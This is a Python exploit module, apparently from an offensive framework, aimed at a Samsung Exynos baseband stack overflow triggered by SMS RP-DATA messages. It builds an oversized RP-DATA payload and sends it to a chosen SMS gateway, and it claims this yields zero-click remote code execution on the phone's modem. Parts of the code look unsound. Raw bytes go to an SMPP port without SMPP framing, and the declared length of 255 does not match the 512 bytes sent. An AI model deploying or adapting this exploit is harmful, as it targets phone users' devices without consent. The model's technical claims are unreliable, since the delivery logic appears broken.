# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Samsung Exynos SMS RP-DATA Stack Buffer Overflow (CVE-2025-54328).

    The Samsung Exynos baseband contains a stack buffer overflow in the
    SMS RP-DATA (Relay Protocol Data) message handler. The RP-User-Data
    field is copied into a stack-allocated buffer using the RP-User-Data
    length without verifying it fits. A crafted RP-DATA message with an
    oversized RP-User-Data field overwrites the stack frame, enabling
    control of the return address for baseband-level code execution.

    Like CVE-2025-62818, this is a zero-click attack processed by the
    modem firmware. However, this vulnerability targets the RP layer
    rather than the TP layer, and corrupts the stack instead of the heap.

    Affected: Samsung Exynos Modem 5123, Modem 5300, Exynos 2200, 2400.

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Samsung Exynos SMS RP-DATA Stack Overflow (CVE-2025-54328)",
        "description": (
            "Exploits CVE-2025-54328, a stack buffer overflow in the "
            "Samsung Exynos baseband SMS RP-DATA handler. The RP-User-Data "
            "field length is not validated before copying to a stack buffer. "
            "A crafted RP-DATA message overwrites the stack frame, enabling "
            "baseband-level RCE. Zero-click attack via SMS."
        ),
        "authors": (
            "Google Project Zero (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-54328",
            "https://security.samsungmobile.com/securityUpdate.smsb",
        ),
        "disclosure_date": "2025-08-01",
        "platform": "hardware",
        "arch": "arm",
        "privileged": True,
        "targets": (
            "Samsung Exynos Modem 5123",
            "Samsung Exynos Modem 5300",
            "Samsung Exynos 2200/2400",
        ),
    }

    target = OptIP("", "Target SMSC or gateway address")
    port = OptPort(2775, "SMPP port on SMSC")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    overflow_size = OptInteger(512, "RP-User-Data overflow size in bytes")

    # RP message type indicators (3GPP TS 24.011)
    _RP_DATA_MT = 0x01  # Mobile Terminated RP-DATA
    _RP_DATA_MO = 0x00  # Mobile Originated RP-DATA
    _RP_ACK = 0x02
    _RP_ERROR = 0x04

    # RP-DATA IE constants
    _RP_MESSAGE_REF_LEN = 1
    _RP_OA_MAX_LEN = 12  # max originating address length

    def _encode_bcd_number(self, number: str) -> bytes:
        """Encode a number in BCD semi-octet format."""
        digits = number.replace("+", "")
        if len(digits) % 2:
            digits += "F"
        result = b""
        for i in range(0, len(digits), 2):
            lo = int(digits[i]) if digits[i] != "F" else 0x0F
            hi = int(digits[i + 1]) if digits[i + 1] != "F" else 0x0F
            result += struct.pack("B", (hi << 4) | lo)
        return result

    def _build_rp_data(self, oversized: bool = True) -> bytes:
        """Build an RP-DATA message with optional stack overflow.

        The vulnerable parser reads the RP-User-Data length field and
        copies that many bytes into a stack-allocated buffer without
        checking whether the declared length exceeds the buffer size.
        """
        # RP Message Type Indicator
        mti = struct.pack("B", self._RP_DATA_MT)

        # RP Message Reference
        msg_ref = struct.pack("B", 0x01)

        # RP-Originating-Address (SMSC number)
        smsc_number = "1234567"
        smsc_bcd = self._encode_bcd_number(smsc_number)
        rp_oa = struct.pack("BB", len(smsc_number), 0x91) + smsc_bcd

        # RP-Destination-Address (empty for MT)
        rp_da = struct.pack("B", 0x00)

        if oversized:
            # RP-User-Data with declared length exceeding stack buffer
            # The actual SMS TPDU payload is replaced with overflow data
            rp_ud_data = b"\x42" * self.overflow_size
            rp_ud_len = min(len(rp_ud_data), 255)
            rp_ud = struct.pack("B", rp_ud_len) + rp_ud_data
        else:
            # Normal small TPDU
            tpdu = b"\x04\x0B\x91\x21\x43\x65\x87\x09\x00\x00"
            rp_ud = struct.pack("B", len(tpdu)) + tpdu

        return mti + msg_ref + rp_oa + rp_da + rp_ud

    def _build_nas_sms_transport(self, rp_data: bytes) -> bytes:
        """Wrap RP-DATA in NAS SMS transport container."""
        # NAS message type for DL NAS Transport (SMS)
        # Protocol discriminator: SMS (0x09)
        pd = struct.pack("B", 0x09)
        # Transaction ID
        ti = struct.pack("B", 0x00)
        return pd + ti + rp_data

    @mute
    def check(self) -> bool:
        """Verify connectivity to target."""
        if not self.target:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((str(self.target), self.port))
            sock.close()
            return result == 0
        except OSError:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("target (SMSC or gateway address) is required")
            return

        print_status("Preparing SMS RP-DATA stack overflow payload")
        self._exploit()

    def _exploit(self) -> None:
        normal_rp = self._build_rp_data(oversized=False)
        trigger_rp = self._build_rp_data(oversized=True)
        nas_pdu = self._build_nas_sms_transport(trigger_rp)

        print_status(f"Normal RP-DATA: {len(normal_rp)} bytes")
        print_status(f"Overflow RP-DATA: {len(trigger_rp)} bytes")
        print_status(f"NAS transport PDU: {len(nas_pdu)} bytes")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), self.port))

            print_status("Sending crafted RP-DATA via gateway")
            sock.send(nas_pdu)
            time.sleep(0.5)

            sock.close()
            print_success(
                "Overflow RP-DATA delivered. The Exynos baseband copies "
                f"{self.overflow_size} bytes of RP-User-Data into a "
                "stack buffer, overwriting the return address. Combined "
                "with a ROP chain, this achieves baseband-level RCE."
            )
        except OSError as e:
            print_error(f"Delivery failed: {e}")
